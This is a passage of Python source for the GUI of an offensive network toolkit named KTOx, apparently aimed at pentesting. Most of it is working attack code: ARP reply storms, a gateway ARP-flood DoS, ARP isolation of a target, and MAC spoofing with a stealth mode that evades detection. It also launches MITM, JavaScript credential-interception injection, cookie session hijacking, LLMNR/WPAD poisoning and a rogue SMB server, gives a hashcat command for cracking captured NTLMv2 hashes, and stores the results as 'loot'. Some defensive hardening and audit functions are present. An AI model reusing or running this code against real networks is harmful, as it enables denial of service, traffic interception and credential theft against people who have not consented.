                  stop_filter=lambda _: stop_flag.is_set())
            self._log("ARP Watch stopped.", "dim")
            self._setstatus("● READY", GREEN)
        threading.Thread(target=_run, daemon=True).start()

    def _recon(self):
        raw = self._targets.get().strip().split(",")[0].strip()
        if raw.isdigit():
            idx = int(raw)
            raw = hosts_list[idx][0] if idx < len(hosts_list) else raw
        ip = raw
        if not ip:
            self._log("Specify a target IP or index.", "orange"); return
        self._log(f"Recon: {ip}", "yellow")
        def _run():
            mac = _retrieve_mac(ip)
            self._log(f"  MAC:    {mac or 'N/A'}", "white")
            self._log(f"  Vendor: {_resolve_vendor(mac)}", "white")
            self._log(f"  Host:   {_resolve_hostname(ip)}", "white")
            _log_event("RECON", ip=ip, mac=mac)
            try:
                nm = nmap.PortScanner()
                nm.scan(hosts=ip, arguments="-F -T4")
                if ip in nm.all_hosts():
                    for proto in nm[ip].all_protocols():
                        for port in sorted(nm[ip][proto]):
                            info = nm[ip][proto][port]
                            tag  = "green" if info['state']=="open" else "dim"
                            self._log(f"  {port}/{proto}  {info['state']}  {info['name']}", tag)
                else:
                    self._log("  No port data.", "dim")
            except Exception as ex:
                self._log(f"  nmap: {ex}", "orange")
        threading.Thread(target=_run, daemon=True).start()

    def _snapshot(self):
        self._log("ARP table snapshot:", "yellow")
        import subprocess
        try:
            out = subprocess.check_output(["arp","-a"], text=True)
            entries = []
            for line in out.strip().splitlines():
                parts = line.split()
                try:
                    host  = parts[0]
                    ip    = parts[1].strip("()")
                    mac   = parts[3] if len(parts)>3 else "N/A"
                    iface = parts[-1] if len(parts)>5 else "N/A"
                    self._log(f"  {ip}  {mac}  {host}", "white")
                    entries.append({"ip":ip,"mac":mac,"host":host})
                except: pass
            _log_event("ARP_SNAPSHOT", count=len(entries))
            self._log(f"Snapshot: {len(entries)} entries.", "green")
        except Exception as ex:
            self._log(f"arp error: {ex}", "red")


    # ── ARP Request Scan ─────────────────────────────────────────────────────
    def _arp_scan(self):
        self._log("ARP Request Scan starting...", "yellow")
        def _run():
            try:
                from scapy.all import srp, Ether, ARP
                net = _get_interface(True)
                self._log(f"Scanning {net}...", "dim")
                answered, _ = srp(
                    Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net),
                    timeout=3, verbose=False
                )
                self._log(f"Found {len(answered)} host(s):", "green")
                for _, rcv in answered:
                    ip     = rcv[ARP].psrc
                    mac    = rcv[Ether].src
                    vendor = _resolve_vendor(mac)
                    note   = " [GATEWAY]" if ip == default_gateway_ip else ""
                    self._log(f"  {ip}  {mac}  {vendor}{note}", "white")
                    _log_event("ARP_SCAN_HOST", ip=ip, mac=mac, vendor=vendor)
                _log_event("ARP_SCAN_COMPLETE", count=len(answered))
            except Exception as ex:
                self._log(f"ARP scan error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    # ── MAC Spoof ─────────────────────────────────────────────────────────────
    def _mac_spoof(self):
        global default_iface_mac
        import subprocess, random as _rnd

        self._log(f"Current MAC: {default_iface_mac}  iface: {default_interface}", "dim")

        # Simple input dialog
        dialog = ctk.CTkInputDialog(
            text=f"Enter new MAC or leave blank to randomise:",
            title="MAC Spoof"
        )
        val = dialog.get_input()
        if val is None:
            return

        if val.strip() == "":
            new_mac = "02:" + ":".join(f"{_rnd.randint(0,255):02x}" for _ in range(5))
        else:
            new_mac = val.strip()

        def _apply():
            try:
                subprocess.run(["ip","link","set", default_interface,"down"],
                               check=True, capture_output=True)
                subprocess.run(["ip","link","set", default_interface,"address", new_mac],
                               check=True, capture_output=True)
                subprocess.run(["ip","link","set", default_interface,"up"],
                               check=True, capture_output=True)
                default_iface_mac = new_mac
                self._log(f"MAC changed → {new_mac}", "green")
                self.after(0, lambda: self._ib_mac.configure(text=new_mac))
                _log_event("MAC_SPOOF", new_mac=new_mac)
            except Exception as ex:
                self._log(f"MAC spoof failed: {ex}", "red")
        threading.Thread(target=_apply, daemon=True).start()

    # ── ARP Reply Storm ───────────────────────────────────────────────────────
    def _do_storm(self, ppm, cap):
        pps      = max(1, ppm * 10)
        interval = 1.0 / pps
        self._log(f"▶ ARP REPLY STORM → broadcast  @{pps}pps", "red")
        _log_event("STORM_START", pps=pps, cap=cap)
        stop_flag.clear()
        self._attacking = True
        self._setstatus("● STORMING", RED_HOT)
        sent = [0]
        def _loop():
            while not stop_flag.is_set():
                fi = ".".join(str(random.randint(1,254)) for _ in range(4))
                fm = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
                try:
                    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                        op=2, psrc=fi, hwsrc=fm,
                        pdst="255.255.255.255", hwdst="ff:ff:ff:ff:ff:ff"
                    ), verbose=False)
                    sent[0] += 1
                    if cap > 0 and sent[0] >= cap:
                        stop_flag.set()
                        self._log(f"Storm cap reached ({cap}).", "yellow")
                        break
                except: pass
                time.sleep(interval)
                if sent[0] % 100 == 0:
                    self.after(0, lambda s=sent[0]: self._setstatus(f"● STM {s}pkt", RED_HOT))
            _log_event("STORM_END", sent=sent[0])
        self._atk_thread = threading.Thread(target=_loop, daemon=True)
        self._atk_thread.start()

    # ── Gateway DoS ───────────────────────────────────────────────────────────
    def _do_gw_dos(self, ppm, cap):
        gw_mac = default_gateway_mac or _retrieve_mac(default_gateway_ip)
        if not gw_mac:
            self._log(f"Cannot resolve gateway MAC.", "red"); return
        pps      = max(1, ppm * 10)
        interval = 1.0 / pps
        self._log(f"▶ GATEWAY DoS → {default_gateway_ip}  @{pps}pps", "red")
        _log_event("GW_DOS_START", gateway=default_gateway_ip, pps=pps)
        stop_flag.clear()
        self._attacking = True
        self._setstatus("● GW DoS", RED_HOT)
        sent = [0]
        def _loop():
            while not stop_flag.is_set():
                fi = ".".join(str(random.randint(1,254)) for _ in range(4))
                fm = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
                try:
                    sendp(Ether(dst=gw_mac)/ARP(
                        op=2, pdst=default_gateway_ip, hwdst=gw_mac,
                        psrc=fi, hwsrc=fm
                    ), verbose=False)
                    sent[0] += 1
                    if cap > 0 and sent[0] >= cap:
                        stop_flag.set(); break
                except: pass
                time.sleep(interval)
            _log_event("GW_DOS_END", sent=sent[0])
        self._atk_thread = threading.Thread(target=_loop, daemon=True)
        self._atk_thread.start()

    # ── ARP Cage ─────────────────────────────────────────────────────────────
    def _do_cage(self, ppm, cap):
        raw = self._targets.get().strip().split(",")[0].strip()
        if raw.isdigit():
            idx = int(raw)
            target_ip = hosts_list[idx][0] if idx < len(hosts_list) else raw
        else:
            target_ip = raw
        target_mac = _retrieve_mac(target_ip)
        if not target_mac:
            self._log(f"Cannot resolve MAC for {target_ip}", "red"); return

        self._log(f"▶ ARP CAGE → isolating {target_ip} from {len(hosts_list)-1} peers", "red")
        _log_event("CAGE_START", target=target_ip)
        stop_flag.clear()
        self._attacking = True
        self._attack_targets = [(target_ip, target_mac)]
        self._setstatus("● CAGING", RED_HOT)
        interval = 60.0 / float(ppm)
        sent = [0]

        def _loop():
            while not stop_flag.is_set():
                for host in hosts_list:
                    if stop_flag.is_set(): break
                    peer_ip = host[0]
                    if peer_ip == target_ip: continue
                    try:
                        sendp(Ether(dst=target_mac)/ARP(
                            op=2, pdst=target_ip, hwdst=target_mac,
                            psrc=peer_ip, hwsrc=default_iface_mac
                        ), verbose=False)
                        sent[0] += 1
                        if cap > 0 and sent[0] >= cap:
                            stop_flag.set(); break
                    except: pass
                    time.sleep(interval / max(1, len(hosts_list)))
            _log_event("CAGE_END", sent=sent[0])

        self._atk_thread = threading.Thread(target=_loop, daemon=True)
        self._atk_thread.start()

    # ── Live ARP Diff ─────────────────────────────────────────────────────────
    def _arp_diff(self):
        self._log("Live ARP Diff started — polling OS ARP table...", "yellow")
        self._setstatus("● ARP DIFF", YELLOW)
        _log_event("ARP_DIFF_START")
        stop_flag.clear()

        def _get_table():
            table = {}
            try:
                import subprocess as sp
                out = sp.check_output(["arp","-an"], text=True)
                for line in out.strip().splitlines():
                    parts = line.split()
                    try:
                        ip  = parts[1].strip("()")
                        mac = parts[3]
                        if mac != "<incomplete>":
                            table[ip] = mac
                    except: pass
            except: pass
            return table

        def _run():
            baseline = _get_table()
            self._log(f"Baseline: {len(baseline)} entries. Polling every 5s...", "green")
            poll = 0
            while not stop_flag.is_set():
                time.sleep(5)
                current = _get_table()
                poll += 1
                changed = False
                for ip, mac in current.items():
                    if ip in baseline and baseline[ip] != mac:
                        self._log(f"⚡ CHANGE  {ip}  {baseline[ip]} → {mac}", "red")
                        _log_event("ARP_DIFF_CHANGE", ip=ip, old=baseline[ip], new=mac)
                        baseline[ip] = mac
                        changed = True
                    elif ip not in baseline:
                        self._log(f"+ NEW  {ip}  {mac}", "yellow")
                        baseline[ip] = mac
                        changed = True
                for ip in list(baseline.keys()):
                    if ip not in current:
                        self._log(f"- GONE  {ip}", "dim")
                        del baseline[ip]
                        changed = True
                if not changed:
                    self._log(f"[poll {poll}]  no changes", "dim")
            self._log("ARP Diff stopped.", "dim")
            self._setstatus("● READY", GREEN)
            _log_event("ARP_DIFF_STOP", polls=poll)

        threading.Thread(target=_run, daemon=True).start()
        self._log("Press STOP & RE-ARP to end ARP Diff.", "dim")

    # ── Rogue Device Detector ─────────────────────────────────────────────────
    def _rogue_detect(self):
        if not hosts_list:
            self._log("Run a scan first to build baseline.", "orange"); return
        baseline_macs = {h[1]: h[0] for h in hosts_list if h[1]}
        self._log(f"Rogue Detector started — baseline: {len(baseline_macs)} MACs.", "yellow")
        self._setstatus("● ROGUE WATCH", YELLOW)
        _log_event("ROGUE_DETECT_START", count=len(baseline_macs))
        stop_flag.clear()
        poll = [0]

        def _run():
            while not stop_flag.is_set():
                time.sleep(30)
                poll[0] += 1
                try:
                    current = scan.scanNetwork(_get_interface(True))
                except: continue
                for host in current:
                    ip  = host[0]; mac = host[1]
                    if not mac: continue
                    if mac not in baseline_macs:
                        vendor = _resolve_vendor(mac)
                        self._log(f"⚡ ROGUE  {ip}  {mac}  {vendor}", "red")
                        _log_event("ROGUE_DETECTED", ip=ip, mac=mac, vendor=vendor)
                        baseline_macs[mac] = ip
                    else:
                        self._log(f"[poll {poll[0]}]  {len(current)} hosts  clean", "dim")
            self._log("Rogue Detector stopped.", "dim")
            self._setstatus("● READY", GREEN)

        threading.Thread(target=_run, daemon=True).start()
        self._log("Press STOP & RE-ARP to end Rogue Detector.", "dim")

    # ── ARP Hardening ─────────────────────────────────────────────────────────
    def _arp_harden(self):
        if not hosts_list:
            self._log("Run a scan first.", "orange"); return
        self._log(f"Applying static ARP entries for {len(hosts_list)} hosts...", "yellow")
        import subprocess as sp
        applied = 0; failed = 0
        for host in hosts_list:
            ip = host[0]; mac = host[1]
            if ip and mac and mac != "N/A":
                try:
                    sp.run(["arp","-s",ip,mac], check=True, capture_output=True)
                    self._log(f"  ✔ {ip}  {mac}", "green")
                    applied += 1
                except:
                    self._log(f"  ✖ {ip}  failed", "red")
                    failed += 1
        # Save script
        os.makedirs("ktox_loot", exist_ok=True)
        script = os.path.join("ktox_loot", "arp_harden.sh")
        with open(script, "w") as f:
            f.write("#!/bin/bash\n# KTOx ARP Hardening Script\n")
            for h in hosts_list:
                if h[0] and h[1] and h[1] != "N/A":
                    f.write(f"arp -s {h[0]} {h[1]}\n")
        os.chmod(script, 0o755)
        self._log(f"Applied {applied} entries. Script → {script}", "green")
        _log_event("ARP_HARDEN", applied=applied, failed=failed)

    # ── Baseline Export ───────────────────────────────────────────────────────
    def _baseline_export(self):
        if not hosts_list:
            self._log("Run a scan first.", "orange"); return
        os.makedirs("ktox_loot", exist_ok=True)
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join("ktox_loot", f"baseline_{ts}.json")
        data = {
            "generated":   datetime.now().isoformat(),
            "interface":   default_interface,
            "gateway_ip":  default_gateway_ip,
            "gateway_mac": default_gateway_mac,
            "hosts": [
                {"ip": h[0], "mac": h[1],
                 "vendor": _resolve_vendor(h[1]),
                 "hostname": _resolve_hostname(h[0]),
                 "is_gateway": h[0] == default_gateway_ip}
                for h in hosts_list
            ]
        }
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
        self._log(f"Baseline exported → {path}  ({len(hosts_list)} hosts)", "green")
        _log_event("BASELINE_EXPORTED", path=path, hosts=len(hosts_list))


    # ── MITM Engine ───────────────────────────────────────────────────────────
    def _mitm_engine(self):
        self._log("Launching MITM Engine — check TUI or run ktox_mitm.py directly.", "yellow")
        self._log("Full MITM requires terminal interaction for configuration.", "dim")
        import subprocess, threading
        def _run():
            try:
                subprocess.run(["sudo","python3","ktox_mitm.py"])
            except Exception as ex:
                self._log(f"MITM error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    # ── JS Injector ───────────────────────────────────────────────────────────
    def _js_inject(self):
        self._log("JS/HTML Injector starting...", "yellow")
        def _run():
            try:
                import ktox_advanced
                inj = ktox_advanced.JSInjector(
                    attacker_ip=default_iface_mac and get_if_addr(default_interface) or "?",
                    payload_name="credential_intercept"
                )
                inj.start()
                self._log("JS Injector active — listening port 8080.", "green")
                self._log("Inject: credential_intercept payload loaded.", "dim")
                _log_event("JS_INJECTOR_START")
            except Exception as ex:
                self._log(f"JS Inject error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    # ── Proto Sniffer ─────────────────────────────────────────────────────────
    def _proto_sniff(self):
        self._log("Multi-Protocol Sniffer starting...", "yellow")
        self._setstatus("● SNIFFING", YELLOW)
        def _run():
            try:
                import ktox_advanced
                ktox_advanced.stop_flag.clear()
                snf = ktox_advanced.MultiProtocolSniffer(default_interface)
                snf.start()
                self._log("Sniffer active: FTP SMTP POP3 IMAP Telnet IRC Redis HTTP", "green")
            except Exception as ex:
                self._log(f"Sniffer error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    # ── PCAP Capture ──────────────────────────────────────────────────────────
    def _pcap_capture(self):
        self._log("PCAP capture starting...", "yellow")
        def _run():
            try:
                import ktox_advanced
                ktox_advanced.stop_flag.clear()
                cap = ktox_advanced.PCAPCapture(default_interface)
                cap.start()
                self._log(f"PCAP capturing → {cap.filename}", "green")
            except Exception as ex:
                self._log(f"PCAP error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    # ── NTLMv2 Capture ────────────────────────────────────────────────────────
    def _ntlm_capture(self):
        self._log("NTLMv2 Hash Capture starting...", "yellow")
        def _run():
            try:
                import ktox_advanced
                from scapy.all import get_if_addr
                attacker_ip = get_if_addr(default_interface)
                ktox_advanced.stop_flag.clear()
                nc = ktox_advanced.NTLMCapture(default_interface, attacker_ip)
                nc.start()
                self._log("NTLMv2 capture active — SMB/445, HTTP/80", "green")
                self._log("Hashes → ktox_loot/ntlm_hashes.txt", "dim")
            except Exception as ex:
                self._log(f"NTLM error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    # ── Session Hijacker ──────────────────────────────────────────────────────
    def _session_hijack(self):
        self._log("Session Hijacker starting...", "yellow")
        def _run():
            try:
                import ktox_advanced
                ktox_advanced.stop_flag.clear()
                sh = ktox_advanced.SessionHijacker(default_interface)
                sh.start()
                self._log("Session Hijacker active — watching HTTP cookies", "green")
                self._log("Replay scripts → ktox_loot/session_replay.sh", "dim")
            except Exception as ex:
                self._log(f"Session hijack error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    # ── Caplet Runner ─────────────────────────────────────────────────────────
    def _run_caplet(self):
        dialog = ctk.CTkInputDialog(
            text="Enter .ktox caplet path (or 'example' to generate one):",
            title="Caplet Runner"
        )
        path = dialog.get_input()
        if not path: return

        def _run():
            try:
                import ktox_advanced
                from scapy.all import get_if_addr
                attacker_ip = get_if_addr(default_interface)

                if path.lower() == "example":
                    out = os.path.join("ktox_loot", "example.ktox")
                    ktox_advanced.CapletEngine.example_caplet(
                        out, attacker_ip, default_interface, default_gateway_ip
                    )
                    self._log(f"Example caplet → {out}", "green")
                    return

                if not os.path.exists(path):
                    self._log(f"File not found: {path}", "red"); return

                ctx = {"iface": default_interface,
                       "attacker_ip": attacker_ip,
                       "gateway_ip": default_gateway_ip}
                engine  = ktox_advanced.CapletEngine(path, ctx)
                threads = engine.run(ctx)
                self._log(f"Caplet running — {len(threads)} module(s) started.", "green")
            except Exception as ex:
                self._log(f"Caplet error: {ex}", "red")

        threading.Thread(target=_run, daemon=True).start()

    # ── Web Dashboard ─────────────────────────────────────────────────────────
    def _web_dashboard(self):
        self._log("Starting web dashboard on port 9999...", "yellow")
        def _run():
            try:
                import ktox_dashboard
                from scapy.all import get_if_addr
                attacker_ip = get_if_addr(default_interface)
                ktox_dashboard.start_dashboard(
                    port=9999,
                    iface=default_interface,
                    attacker_ip=attacker_ip,
                    gateway_ip=default_gateway_ip,
                    active_modules=["ARP","DNS","HTTP","Advanced"]
                )
                self._log(f"Dashboard live → http://{attacker_ip}:9999", "green")
                self._log("Open in any browser on this machine.", "dim")
            except Exception as ex:
                self._log(f"Dashboard error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()


    # ── LLMNR / NBT-NS Poisoner ───────────────────────────────────────────────
    def _llmnr_poison(self):
        self._log("LLMNR/NBT-NS Poisoner starting...", "yellow")
        def _run():
            try:
                import ktox_extended
                from scapy.all import get_if_addr
                attacker_ip = get_if_addr(default_interface)
                ktox_extended.stop_flag.clear()
                p = ktox_extended.LLMNRPoisoner(default_interface, attacker_ip)
                p.start()
                self._log(f"LLMNR poisoner active — UDP/5355 + UDP/137", "green")
                self._log("Waiting for Windows name resolution broadcasts...", "dim")
            except Exception as ex:
                self._log(f"LLMNR error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    # ── WPAD Server ───────────────────────────────────────────────────────────
    def _wpad_server(self):
        self._log("WPAD Rogue Proxy starting on port 8888...", "yellow")
        def _run():
            try:
                import ktox_extended
                from scapy.all import get_if_addr
                attacker_ip = get_if_addr(default_interface)
                ktox_extended.stop_flag.clear()
                w = ktox_extended.WPADPoisoner(attacker_ip, port=8888)
                w.start()
                self._log(f"WPAD server active — http://{attacker_ip}/wpad.dat", "green")
                self._log("Forces NTLM auth on WPAD fetch — captures hashes silently.", "dim")
            except Exception as ex:
                self._log(f"WPAD error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    # ── Rogue SMB ─────────────────────────────────────────────────────────────
    def _rogue_smb(self):
        self._log("Rogue SMB Server starting on port 445...", "yellow")
        def _run():
            try:
                import ktox_extended
                from scapy.all import get_if_addr
                attacker_ip = get_if_addr(default_interface)
                ktox_extended.stop_flag.clear()
                s = ktox_extended.RogueSMBServer(attacker_ip)
                s.start()
                self._log("Rogue SMB active — capturing NTLMv2 hashes", "green")
                self._log("Hashes → ktox_loot/ntlm_hashes.txt", "dim")
            except Exception as ex:
                self._log(f"SMB error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    # ── Full Windows Stack ────────────────────────────────────────────────────
    def _win_stack(self):
        self._log("Launching full Windows attack stack...", "red")
        def _run():
            try:
                import ktox_extended
                from scapy.all import get_if_addr
                attacker_ip = get_if_addr(default_interface)
                ktox_extended.stop_flag.clear()
                ktox_extended.LLMNRPoisoner(default_interface, attacker_ip).start()
                ktox_extended.WPADPoisoner(attacker_ip, port=8888).start()
                ktox_extended.RogueSMBServer(attacker_ip).start()
                self._log("LLMNR + NBT-NS + WPAD + Rogue SMB all active.", "green")
                self._log("Waiting for Windows hosts to broadcast...", "dim")
                self._setstatus("● WIN STACK", RED_HOT)
            except Exception as ex:
                self._log(f"Win stack error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    # ── Topology Map ──────────────────────────────────────────────────────────
    def _topology_map(self):
        if not hosts_list:
            self._log("Run a scan first.", "orange"); return
        self._log("Building topology map...", "yellow")
        def _run():
            try:
                import ktox_extended, json, os
                host_data = [
                    {"ip": h[0], "mac": h[1],
                     "vendor": _resolve_vendor(h[1]),
                     "hostname": _resolve_hostname(h[0])}
                    for h in hosts_list
                ]
                events = []
                if os.path.exists("ktox_loot"):
                    for fname in os.listdir("ktox_loot"):
                        if fname.endswith(".log"):
                            try:
                                with open(os.path.join("ktox_loot", fname)) as f:
                                    for line in f:
                                        try: events.append(json.loads(line.strip()))
                                        except: pass
                            except: pass

                mapper = ktox_extended.TopologyMapper(
                    hosts=host_data,
                    gateway_ip=default_gateway_ip,
                    gateway_mac=default_gateway_mac or "",
                    dns_queries=[e for e in events if e.get("event")=="DNS_QUERY"],
                    http_requests=[e for e in events if e.get("event")=="HTTP_REQUEST"],
                    credentials=[e for e in events if "CRED" in e.get("event","")]
                )
                path = mapper.export_html()
                self._log(f"Topology map → {path}", "green")
                self._log("Open in browser: firefox " + path, "dim")
                _log_event("TOPOLOGY_EXPORTED", path=path)
            except Exception as ex:
                self._log(f"Topology error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    # ── Report Generator ──────────────────────────────────────────────────────
    def _gen_report(self):
        self._log("Generating pentest report...", "yellow")
        def _run():
            try:
                import ktox_extended
                rg   = ktox_extended.ReportGenerator()
                md   = rg.generate_markdown()
                html = rg.generate_html()
                self._log(f"Markdown → {md}", "green")
                self._log(f"HTML     → {html}", "green")
                _log_event("REPORT_GENERATED", md=md, html=html)
            except Exception as ex:
                self._log(f"Report error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    # ── Hash Cracker ──────────────────────────────────────────────────────────
    def _hash_crack(self):
        self._log("Hash Cracker — use TUI for interactive cracking (module [S]).", "yellow")
        self._log("Or run directly: hashcat -m 5600 ktox_loot/ntlm_hashes.txt wordlist.txt", "dim")
        import os
        hfile = os.path.join("ktox_loot", "ntlm_hashes.txt")
        if os.path.exists(hfile):
            with open(hfile) as f:
                lines = [l.strip() for l in f if l.strip()]
            self._log(f"Hash file: {hfile} ({len(lines)} hashes)", "white")
            for line in lines[:5]:
                self._log(f"  {line[:80]}", "dim")
            if len(lines) > 5:
                self._log(f"  ...and {len(lines)-5} more", "dim")
        else:
            self._log("No hash file yet. Capture hashes with LLMNR + Rogue SMB first.", "orange")


    # ── IoT Fingerprinter ─────────────────────────────────────────────────────
    def _iot_fp(self):
        if not hosts_list:
            self._log("Run a scan first.", "orange"); return
        self._log(f"IoT Fingerprinting {len(hosts_list)} host(s)...", "yellow")
        self._setstatus("● FINGERPRINTING", YELLOW)
        def _run():
            try:
                import ktox_stealth
                hosts = [(h[0], h[1]) for h in hosts_list]
                fp    = ktox_stealth.IoTFingerprinter(timeout=2)
                results = []
                for ip, mac in hosts:
                    self._log(f"  Probing {ip}...", "dim")
                    r = fp.fingerprint(ip, mac)
                    results.append(r)
                    dtype = ", ".join(r["device_types"][:2]) or "Unknown"
                    conf  = r["confidence"]
                    icon  = fp._device_icon(r["device_types"])
                    self._log(
                        f"  {icon} {ip}  [{r['manufacturer'][:16]}]  "
                        f"{dtype}  {conf}%",
                        "green" if conf >= 75 else "white"
                    )
                self._log(f"Fingerprinting complete — {len(results)} host(s).", "green")
                self._setstatus("● READY", GREEN)
                import json, os
                os.makedirs("ktox_loot", exist_ok=True)
                from datetime import datetime
                ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
                path = os.path.join("ktox_loot", f"fingerprint_{ts}.json")
                with open(path, "w") as f:
                    json.dump(results, f, indent=2)
                self._log(f"Saved → {path}", "dim")
            except Exception as ex:
                self._log(f"Fingerprint error: {ex}", "red")
                self._setstatus("● READY", GREEN)
        threading.Thread(target=_run, daemon=True).start()

    # ── Stealth Mode ──────────────────────────────────────────────────────────
    def _stealth_mode(self):
        dialog = ctk.CTkInputDialog(
            text="Stealth profile: ghost / ninja / normal",
            title="Stealth Mode"
        )
        profile = dialog.get_input()
        if not profile: return
        profile = profile.strip().lower()
        if profile not in ("ghost", "ninja", "normal"):
            self._log(f"Unknown profile: {profile}. Use ghost/ninja/normal.", "orange")
            return

        def _run():
            try:
                import ktox_stealth
                stealth = ktox_stealth.get_stealth(default_interface, profile)
                stealth.start(gateway_ip=default_gateway_ip)
                self._log(f"Stealth mode active: {profile}", "green")
                p = stealth.profile
                self._log(
                    f"  Rate cap: {p['ppm_cap']} ppm  "
                    f"Jitter: {p['jitter_min']}–{p['jitter_max']}s  "
                    f"MAC rotate: {'every '+str(p['mac_rotate'])+'s' if p['mac_rotate'] else 'off'}",
                    "dim"
                )
                self._setstatus(f"● STEALTH [{profile.upper()}]", YELLOW)
            except Exception as ex:
                self._log(f"Stealth error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()


    # ── Purple Team Defense Methods ───────────────────────────────────────────
    def _defense_run(self, fn_name, *args):
        """Generic wrapper to run defense functions in background."""
        def _run():
            try:
                import ktox_defense
                host_data = [{"ip": h[0], "mac": h[1]} for h in hosts_list]
                fn = getattr(ktox_defense, fn_name, None)
                if fn:
                    fn(*args)
            except Exception as ex:
                self._log(f"Defense error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    def _defense_arp(self):
        self._log("Applying static ARP hardening...", "green")
        def _run():
            try:
                import ktox_defense
                host_data = [{"ip": h[0], "mac": h[1]} for h in hosts_list]
                d = ktox_defense.ArpSpoofDefense()
                applied, failed = d.apply_static_arp(
                    host_data, default_gateway_ip, default_gateway_mac or ""
                )
                self._log(f"ARP hardening: {len(applied)} applied, {len(failed)} failed.", "green")
            except Exception as ex:
                self._log(f"ARP defense error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    def _defense_llmnr(self):
        self._log("Disabling LLMNR + NBT-NS...", "green")
        def _run():
            try:
                import ktox_defense
                d = ktox_defense.LLMNRDefense()
                applied = d.disable_llmnr_linux()
                for a in applied:
                    self._log(f"  ✔ {a}", "green")
            except Exception as ex:
                self._log(f"LLMNR defense error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    def _defense_smb(self):
        self._log("Enforcing SMB signing...", "green")
        def _run():
            try:
                import ktox_defense
                d = ktox_defense.SMBDefense()
                d.enforce_smb_signing()
                self._log("SMB signing enforcement complete.", "green")
            except Exception as ex:
                self._log(f"SMB defense error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    def _defense_tls(self):
        self._log("Applying TLS enforcement...", "green")
        def _run():
            try:
                import ktox_defense
                d = ktox_defense.SSLDefense()
                d.enforce_tls()
                self._log("TLS enforcement complete.", "green")
            except Exception as ex:
                self._log(f"TLS defense error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    def _defense_dns(self):
        self._log("Configuring encrypted DNS (DoT)...", "green")
        def _run():
            try:
                import ktox_defense
                d = ktox_defense.DNSDefense()
                d.configure_doh()
                self._log("Encrypted DNS configured.", "green")
            except Exception as ex:
                self._log(f"DNS defense error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    def _defense_creds(self):
        self._log("Running cleartext protocol audit...", "green")
        def _run():
            try:
                import ktox_defense
                d = ktox_defense.CredentialDefense()
                d.harden_services()
                self._log("Cleartext audit complete. Check output pane.", "green")
            except Exception as ex:
                self._log(f"Credential defense error: {ex}", "red")
        threading.Thread(target=_run, daemon=True).start()

    def _defense_audit(self):
        self._log("Running full purple team security audit...", "yellow")
        self._setstatus("● AUDITING", YELLOW)
        def _run():
            try:
                import ktox_defense
                host_data = [{"ip": h[0], "mac": h[1]} for h in hosts_list]
                a = ktox_defense.SecurityAudit()
                findings, passed = a.run_full_audit(
                    default_interface, host_data,
                    default_gateway_ip, default_gateway_mac or ""
                )
                high = sum(1 for f in findings if f["severity"]=="HIGH")
                med  = sum(1 for f in findings if f["severity"]=="MEDIUM")
                low  = sum(1 for f in findings if f["severity"]=="LOW")
                self._log(
                    f"Audit complete: {high} HIGH · {med} MEDIUM · "
                    f"{low} LOW · {len(passed)} passed",
                    "red" if high else "orange" if med else "green"
                )
                for f in findings:
                    col = "red" if f["severity"]=="HIGH" else "orange" if f["severity"]=="MEDIUM" else "yellow"
                    self._log(f"  [{f['severity']}] {f['issue']}: {f['fix']}", col)
                for p in passed:
                    self._log(f"  ✔ {p}", "green")
                self._setstatus("● READY", GREEN)
            except Exception as ex:
                self._log(f"Audit error: {ex}", "red")
                self._setstatus("● READY", GREEN)
        threading.Thread(target=_run, daemon=True).start()

    # ── Close ─────────────────────────────────────────────────────────────────
    def _on_close(self):
        stop_flag.set()
        if self._attacking and self._attack_targets:
            for _ in range(5):
                for ip, mac in self._attack_targets:
                    if mac and default_gateway_mac:
                        try: spoof.sendPacket(default_gateway_mac,
                                              default_gateway_ip, ip, mac)
                        except: pass
                time.sleep(0.1)
        self.destroy()


def launch():
    if os.geteuid() != 0:
        print("ERROR: sudo python3 ktox.py --gui")
        sys.exit(1)
    app = KTOxApp()
    app.mainloop()

if __name__ == "__main__":
    launch()
